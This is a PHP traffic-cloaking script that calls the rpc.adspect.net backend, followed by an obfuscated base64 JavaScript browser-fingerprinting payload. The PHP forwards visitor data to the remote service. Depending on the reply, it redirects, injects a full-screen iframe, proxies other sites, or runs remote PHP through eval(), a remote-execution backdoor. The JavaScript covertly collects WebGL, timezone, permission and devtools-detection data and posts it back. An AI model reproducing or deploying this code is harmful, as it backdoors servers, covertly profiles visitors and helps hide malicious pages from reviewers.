<?php
 ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url) { $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; $query = parse_url($url, PHP_URL_QUERY); if (is_string($query)) { parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; } } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } header('Content-Type: text/html'); switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); case 'html': case 'htm': header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_tokenize($str, $sep) { $toks = []; $tok = strtok($str, $sep); while ($tok !== false) { $toks[] = $tok; $tok = strtok($sep); } return $toks; } function adspect_x_forwarded_for() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $xff = adspect_tokenize($_SERVER['HTTP_X_FORWARDED_FOR'], ', '); } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_X_REAL_IP']]; } elseif (array_key_exists('HTTP_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_REAL_IP']]; } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_CF_CONNECTING_IP']]; } else { $xff = []; } if (array_key_exists('REMOTE_ADDR', $_SERVER)) { $xff[] = $_SERVER['REMOTE_ADDR']; } return array_unique($xff); } function adspect_headers() { $headers = []; foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $xff, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); $headers[] = 'Cache-Control: no-cache'; if ($xff !== '') { $headers[] = "X-Forwarded-For: {$xff}"; } curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = htmlspecialchars_decode($url); $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } $repl = htmlspecialchars($repl); if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'php-curl extension is missing'); } if (!function_exists('json_encode') || !function_exists('json_decode')) { adspect_exit(500, 'php-json extension is missing'); } $xff = adspect_x_forwarded_for(); $addr = adspect_dig($xff, 0); $xff = implode(', ', $xff); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $xff, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING, ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ 'Accept: application/json', "X-Forwarded-For: {$xff}", "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-JS: {$ajax}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: case 202: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': adspect_spoof_request($target); return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); break; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; break; case 'proxy': adspect_proxy($target, $xff, $param, $key); break; case 'fetch': adspect_proxy($target, $xff); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('1f9cb3b6-d716-4107-8c0f-646d2d315021', 'redirect', '_', base64_decode('8Qm9GoyLu/KxFCv/v79AHvYcJBRrkQqpSQVz4jnTZmU=')); if (!isset($target)) { return; } ?>
<!DOCTYPE html><html><body><script src="data:text/javascript;base64,ZnVuY3Rpb24gXzB4MmExZChfMHg0MmM2NWMsXzB4NDhjMTdmKXt2YXIgXzB4NWVjZmJiPV8weDVlY2YoKTtyZXR1cm4gXzB4MmExZD1mdW5jdGlvbihfMHgyYTFkNmMsXzB4MmI5YWE0KXtfMHgyYTFkNmM9XzB4MmExZDZjLTB4MTYyO3ZhciBfMHgzOWQwZGY9XzB4NWVjZmJiW18weDJhMWQ2Y107cmV0dXJuIF8weDM5ZDBkZjt9LF8weDJhMWQoXzB4NDJjNjVjLF8weDQ4YzE3Zik7fWZ1bmN0aW9uIF8weDVlY2YoKXt2YXIgXzB4MjIzYmViPVsnYWN0aW9uJywnMjRWSWdKdUknLCc2eG9ld2d4JywnYXBwZW5kQ2hpbGQnLCdpbnB1dCcsJ3RvdWNoRXZlbnQnLCczMTM3MWxSa0puTScsJ3RpbWV6b25lT2Zmc2V0JywnaHJlZicsJ3B1c2gnLCdzdGF0ZScsJ21lc3NhZ2UnLCdsb2NhdGlvbicsJ3F1ZXJ5JywndG9zdHJpbmcnLCczNEh0Z0hnQicsJzRjc0t1Sk8nLCd3ZWJnbCcsJ2dldFBhcmFtZXRlcicsJ2NyZWF0ZUV2ZW50JywnZG9jdW1lbnRFbGVtZW50JywnY2FudmFzJywnOTk5MjRwY0FtV04nLCdjbG9zdXJlJywnVU5NQVNLRURfUkVOREVSRVJfV0VCR0wnLCdnZXRFeHRlbnNpb24nLCduYW1lJywnZGF0YScsJ2NvbnNvbGUnLCdvYmplY3QnLCdub3RpZmljYXRpb25zJywnd2luZG93JywndG9TdHJpbmcnLCcyMTUxMmNtaXpYUycsJ3NjcmVlbicsJ25vZGVOYW1lJywnMTIyNE9lRmlidycsJ3Blcm1pc3Npb24nLCduYXZpZ2F0b3InLCdwZXJtaXNzaW9ucycsJzk3NzM0OTBLcmdNTmwnLCdOb3RpZmljYXRpb24nLCdmb3JtJywndHlwZScsJzU1MTI0M2N3cU5lWCcsJzczNzUwNmR6RE9FRycsJ2hpZGRlbicsJ1BPU1QnLCcyMjgwOTQ1UHhReURSJywnZ2V0T3duUHJvcGVydHlOYW1lcycsJ2NyZWF0ZUVsZW1lbnQnLCdsb2cnLCdkb2N1bWVudCddO18weDVlY2Y9ZnVuY3Rpb24oKXtyZXR1cm4gXzB4MjIzYmViO307cmV0dXJuIF8weDVlY2YoKTt9KGZ1bmN0aW9uKF8weDRiZDNmYixfMHgzMzc0YjUpe3ZhciBfMHg1ZWJiZTQ9XzB4MmExZCxfMHgxOGExZjA9XzB4NGJkM2ZiKCk7d2hpbGUoISFbXSl7dHJ5e3ZhciBfMHgzYjA3NjA9cGFyc2VJbnQoXzB4NWViYmU0KDB4MTgyKSkvMHgxKigtcGFyc2VJbnQoXzB4NWViYmU0KDB4MThiKSkvMHgyKStwYXJzZUludChfMHg1ZWJiZTQoMHgxOTIpKS8weDMqKHBhcnNlSW50KF8weDVlYmJlNCgweDE4YykpLzB4NCkrLXBhcnNlSW50KF8weDVlYmJlNCgweDE3NykpLzB4NStwYXJzZUludChfMHg1ZWJiZTQoMHgxN2UpKS8weDYqKHBhcnNlSW50KF8weDVlYmJlNCgweDE3MykpLzB4NykrcGFyc2VJbnQoXzB4NWViYmU0KDB4MTY4KSkvMHg4KihwYXJzZUludChfMHg1ZWJiZTQoMHgxNmIpKS8weDkpK3BhcnNlSW50KF8weDVlYmJlNCgweDE2ZikpLzB4YSstcGFyc2VJbnQoXzB4NWViYmU0KDB4MTc0KSkvMHhiKigtcGFyc2VJbnQoXzB4NWViYmU0KDB4MTdkKSkvMHhjKTtpZihfMHgzYjA3NjA9PT1fMHgzMzc0YjUpYnJlYWs7ZWxzZSBfMHgxOGExZjBbJ3B1c2gnXShfMHgxOGExZjBbJ3NoaWZ0J10oKSk7fWNhdGNoKF8weDJjZjMwOCl7XzB4MThhMWYwWydwdXNoJ10oXzB4MThhMWYwWydzaGlmdCddKCkpO319fShfMHg1ZWNmLDB4OTI2OWEpLChmdW5jdGlvbigpe3ZhciBfMHg1MDY5NDk9XzB4MmExZDtmdW5jdGlvbiBfMHg0MzlkNzcoKXt2YXIgXzB4MmFmNWZiPV8weDJhMWQ7XzB4M2U3MjkxWydlcnJvcnMnXT1fMHg0ZjAxNjY7dmFyIF8weDFkMWNlNT1kb2N1bWVudFtfMHgyYWY1ZmIoMHgxNzkpXShfMHgyYWY1ZmIoMHgxNzEpKSxfMHg0MzM5Yjc9ZG9jdW1lbnRbXzB4MmFmNWZiKDB4MTc5KV0oXzB4MmFmNWZiKDB4MTgwKSk7XzB4MWQxY2U1WydtZXRob2QnXT1fMHgyYWY1ZmIoMHgxNzYpLF8weDFkMWNlNVtfMHgyYWY1ZmIoMHgxN2MpXT13aW5kb3dbXzB4MmFmNWZiKDB4MTg4KV1bXzB4MmFmNWZiKDB4MTg0KV0sXzB4NDMzOWI3W18weDJhZjVmYigweDE3MildPV8weDJhZjVmYigweDE3NSksXzB4NDMzOWI3W18weDJhZjVmYigweDE5NildPV8weDJhZjVmYigweDE2MiksXzB4NDMzOWI3Wyd2YWx1ZSddPUpTT05bJ3N0cmluZ2lmeSddKF8weDNlNzI5MSksXzB4MWQxY2U1W18weDJhZjVmYigweDE3ZildKF8weDQzMzliNyksZG9jdW1lbnRbJ2JvZHknXVtfMHgyYWY1ZmIoMHgxN2YpXShfMHgxZDFjZTUpLF8weDFkMWNlNVsnc3VibWl0J10oKTt9dmFyIF8weDRmMDE2Nj1bXSxfMHgzZTcyOTE9e307dHJ5e3ZhciBfMHg2MTMyNWI9ZnVuY3Rpb24oXzB4MTRmZDBmKXt2YXIgXzB4NTk1NWJhPV8weDJhMWQ7aWYoXzB4NTk1NWJhKDB4MTY0KT09PXR5cGVvZiBfMHgxNGZkMGYmJm51bGwhPT1fMHgxNGZkMGYpe3ZhciBfMHgyYTI0MmQ9ZnVuY3Rpb24oXzB4Mzg3NTgxKXt2YXIgXzB4NDY1NTU0PV8weDU5NTViYTt0cnl7dmFyIF8weDEzODg3ND1fMHgxNGZkMGZbXzB4Mzg3NTgxXTtzd2l0Y2godHlwZW9mIF8weDEzODg3NCl7Y2FzZSBfMHg0NjU1NTQoMHgxNjQpOmlmKG51bGw9PT1fMHgxMzg4NzQpYnJlYWs7Y2FzZSdmdW5jdGlvbic6XzB4MTM4ODc0PV8weDEzODg3NFtfMHg0NjU1NTQoMHgxNjcpXSgpO31fMHg1YjA0ZTdbXzB4Mzg3NTgxXT1fMHgxMzg4NzQ7fWNhdGNoKF8weDFhNjljZil7XzB4NGYwMTY2W18weDQ2NTU1NCgweDE4NSldKF8weDFhNjljZltfMHg0NjU1NTQoMHgxODcpXSk7fX0sXzB4NWIwNGU3PXt9LF8weDNkZTIxYTtmb3IoXzB4M2RlMjFhIGluIF8weDE0ZmQwZilfMHgyYTI0MmQoXzB4M2RlMjFhKTt0cnl7dmFyIF8weDNjMGUzYT1PYmplY3RbXzB4NTk1NWJhKDB4MTc4KV0oXzB4MTRmZDBmKTtmb3IoXzB4M2RlMjFhPTB4MDtfMHgzZGUyMWE8XzB4M2MwZTNhWydsZW5ndGgnXTsrK18weDNkZTIxYSlfMHgyYTI0MmQoXzB4M2MwZTNhW18weDNkZTIxYV0pO18weDViMDRlN1snISEnXT1fMHgzYzBlM2E7fWNhdGNoKF8weDNiOTEyMyl7XzB4NGYwMTY2W18weDU5NTViYSgweDE4NSldKF8weDNiOTEyM1tfMHg1OTU1YmEoMHgxODcpXSk7fXJldHVybiBfMHg1YjA0ZTc7fX07XzB4M2U3MjkxW18weDUwNjk0OSgweDE2OSldPV8weDYxMzI1Yih3aW5kb3dbXzB4NTA2OTQ5KDB4MTY5KV0pLF8weDNlNzI5MVtfMHg1MDY5NDkoMHgxNjYpXT1fMHg2MTMyNWIod2luZG93KSxfMHgzZTcyOTFbXzB4NTA2OTQ5KDB4MTZkKV09XzB4NjEzMjViKHdpbmRvd1tfMHg1MDY5NDkoMHgxNmQpXSksXzB4M2U3MjkxW18weDUwNjk0OSgweDE4OCldPV8weDYxMzI1Yih3aW5kb3dbXzB4NTA2OTQ5KDB4MTg4KV0pLF8weDNlNzI5MVtfMHg1MDY5NDkoMHgxNjMpXT1fMHg2MTMyNWIod2luZG93W18weDUwNjk0OSgweDE2MyldKSxfMHgzZTcyOTFbXzB4NTA2OTQ5KDB4MTkwKV09ZnVuY3Rpb24oXzB4M2M1ODc0KXt2YXIgXzB4MzA1M2I2PV8weDUwNjk0OTt0cnl7dmFyIF8weDMxNTU3Yj17fTtfMHgzYzU4NzQ9XzB4M2M1ODc0WydhdHRyaWJ1dGVzJ107Zm9yKHZhciBfMHg0YWM5YmEgaW4gXzB4M2M1ODc0KV8weDRhYzliYT1fMHgzYzU4NzRbXzB4NGFjOWJhXSxfMHgzMTU1N2JbXzB4NGFjOWJhW18weDMwNTNiNigweDE2YSldXT1fMHg0YWM5YmFbJ25vZGVWYWx1ZSddO3JldHVybiBfMHgzMTU1N2I7fWNhdGNoKF8weDQxZGFiZCl7XzB4NGYwMTY2W18weDMwNTNiNigweDE4NSldKF8weDQxZGFiZFtfMHgzMDUzYjYoMHgxODcpXSk7fX0oZG9jdW1lbnRbXzB4NTA2OTQ5KDB4MTkwKV0pLF8weDNlNzI5MVtfMHg1MDY5NDkoMHgxN2IpXT1fMHg2MTMyNWIoZG9jdW1lbnQpO3RyeXtfMHgzZTcyOTFbXzB4NTA2OTQ5KDB4MTgzKV09bmV3IERhdGUoKVsnZ2V0VGltZXpvbmVPZmZzZXQnXSgpO31jYXRjaChfMHgyNGI2ZWUpe18weDRmMDE2NltfMHg1MDY5NDkoMHgxODUpXShfMHgyNGI2ZWVbXzB4NTA2OTQ5KDB4MTg3KV0pO310cnl7XzB4M2U3MjkxW18weDUwNjk0OSgweDE5MyldPWZ1bmN0aW9uKCl7fVtfMHg1MDY5NDkoMHgxNjcpXSgpO31jYXRjaChfMHg1Yzk0ZWYpe18weDRmMDE2NlsncHVzaCddKF8weDVjOTRlZltfMHg1MDY5NDkoMHgxODcpXSk7fXRyeXtfMHgzZTcyOTFbXzB4NTA2OTQ5KDB4MTgxKV09ZG9jdW1lbnRbXzB4NTA2OTQ5KDB4MThmKV0oJ1RvdWNoRXZlbnQnKVtfMHg1MDY5NDkoMHgxNjcpXSgpO31jYXRjaChfMHgxOGE2ZTApe18weDRmMDE2NltfMHg1MDY5NDkoMHgxODUpXShfMHgxOGE2ZTBbJ21lc3NhZ2UnXSk7fXRyeXtfMHg2MTMyNWI9ZnVuY3Rpb24oKXt9O3ZhciBfMHg0NTdjMDg9MHgwO18weDYxMzI1YlsndG9TdHJpbmcnXT1mdW5jdGlvbigpe3JldHVybisrXzB4NDU3YzA4LCcnO30sY29uc29sZVtfMHg1MDY5NDkoMHgxN2EpXShfMHg2MTMyNWIpLF8weDNlNzI5MVtfMHg1MDY5NDkoMHgxOGEpXT1fMHg0NTdjMDg7fWNhdGNoKF8weDVkZDVjZSl7XzB4NGYwMTY2W18weDUwNjk0OSgweDE4NSldKF8weDVkZDVjZVtfMHg1MDY5NDkoMHgxODcpXSk7fXdpbmRvd1tfMHg1MDY5NDkoMHgxNmQpXVtfMHg1MDY5NDkoMHgxNmUpXVtfMHg1MDY5NDkoMHgxODkpXSh7J25hbWUnOl8weDUwNjk0OSgweDE2NSl9KVsndGhlbiddKGZ1bmN0aW9uKF8weDFhMmYyZSl7dmFyIF8weDU3YWNlNj1fMHg1MDY5NDk7XzB4M2U3MjkxWydwZXJtaXNzaW9ucyddPVt3aW5kb3dbXzB4NTdhY2U2KDB4MTcwKV1bXzB4NTdhY2U2KDB4MTZjKV0sXzB4MWEyZjJlW18weDU3YWNlNigweDE4NildXSxfMHg0MzlkNzcoKTt9LF8weDQzOWQ3Nyk7dHJ5e3ZhciBfMHg1MDg2OTg9ZG9jdW1lbnRbJ2NyZWF0ZUVsZW1lbnQnXShfMHg1MDY5NDkoMHgxOTEpKVsnZ2V0Q29udGV4dCddKF8weDUwNjk0OSgweDE4ZCkpLF8weDJlMTRlZT1fMHg1MDg2OThbXzB4NTA2OTQ5KDB4MTk1KV0oJ1dFQkdMX2RlYnVnX3JlbmRlcmVyX2luZm8nKTtfMHgzZTcyOTFbXzB4NTA2OTQ5KDB4MThkKV09eyd2ZW5kb3InOl8weDUwODY5OFsnZ2V0UGFyYW1ldGVyJ10oXzB4MmUxNGVlWydVTk1BU0tFRF9WRU5ET1JfV0VCR0wnXSksJ3JlbmRlcmVyJzpfMHg1MDg2OThbXzB4NTA2OTQ5KDB4MThlKV0oXzB4MmUxNGVlW18weDUwNjk0OSgweDE5NCldKX07fWNhdGNoKF8weDU5YmY4Yil7XzB4NGYwMTY2W18weDUwNjk0OSgweDE4NSldKF8weDU5YmY4YltfMHg1MDY5NDkoMHgxODcpXSk7fX1jYXRjaChfMHg1NjE5ODQpe18weDRmMDE2NlsncHVzaCddKF8weDU2MTk4NFsnbWVzc2FnZSddKSxfMHg0MzlkNzcoKTt9fSgpKSk7"></script></body></html><?php exit;